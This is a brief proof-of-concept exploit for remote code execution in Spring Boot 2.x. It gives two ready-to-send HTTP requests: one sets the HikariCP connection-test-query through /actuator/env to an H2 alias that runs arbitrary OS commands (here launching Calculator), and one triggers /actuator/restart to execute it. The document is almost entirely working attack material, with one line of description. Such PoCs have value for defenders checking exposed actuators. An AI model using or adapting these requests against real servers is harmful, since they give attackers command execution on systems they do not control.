## Spring Boot 2.x RCE with HikariCP

### Description
A rce method in Spring Boot 2.x.

### PoC


```
POST /actuator/env HTTP/1.1

content-type: application/json

{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}'; CALL EXEC('/Applications/Calculator.app/Contents/MacOS/Calculator');"}
```

```
POST /actuator/restart HTTP/1.1

content-type: application/json

{}
```